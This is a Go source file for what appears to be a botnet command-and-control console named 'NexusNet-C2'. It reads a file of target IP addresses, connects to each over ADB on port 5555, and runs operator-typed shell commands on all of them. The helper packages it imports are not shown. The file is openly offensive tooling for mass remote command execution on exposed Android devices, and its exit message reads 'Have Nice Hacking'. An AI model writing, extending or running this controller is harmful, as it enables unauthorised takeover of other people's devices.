package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"strings"

	connect "lbot.init/project/cmd/connect"
	run "lbot.init/project/cmd/run"
	banner "lbot.init/project/pkg/banner"
	clear "lbot.init/project/pkg/clear"
)

func readIPsFromFile(filename string) ([]string, error) {
	var ips []string

	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		ips = append(ips, strings.TrimSpace(scanner.Text()))
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return ips, nil
}

func main() {
	clear.ClearTerminal()
	banner.Pbanner()
	scaner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Printf("NexusNet-C2#> ")
		scaner.Scan()
		input := scaner.Text()

		if strings.ToLower(input) == "exit" {
			fmt.Println("Have Nice Hacking")
			break
		}

		if strings.ToLower(input) == "clear" {
			clear.ClearTerminal()
			banner.Pbanner()
		}

		if strings.ToLower(input) == "help" {
			fmt.Println("Run ADB command : run uname")
			fmt.Println("Template : template screen-shot")
		}

		if strings.ToLower(input) == "devices" {
			adbCommand := "adb devices"
			cmd := exec.Command("sh", "-c", adbCommand)
			output, err := cmd.CombinedOutput()

			if err != nil {
				fmt.Printf("Error")
			}
			fmt.Println(output)

		}

		if strings.HasPrefix(strings.ToLower(input), "run ") {
			execute := strings.TrimSpace(strings.TrimPrefix(strings.ToLower(input), "run "))
			customPort := 5555

			// Read IPs from file
			ips, err := readIPsFromFile("connection/Ipaddress.txt")
			if err != nil {
				fmt.Println("Error reading IPs from file:", err)
				continue
			}

			// Connect to each device and run command
			for _, ip := range ips {
				connect.Connect([]string{ip})

				run.Run(execute, customPort, ip)
			}
		}

	}
}
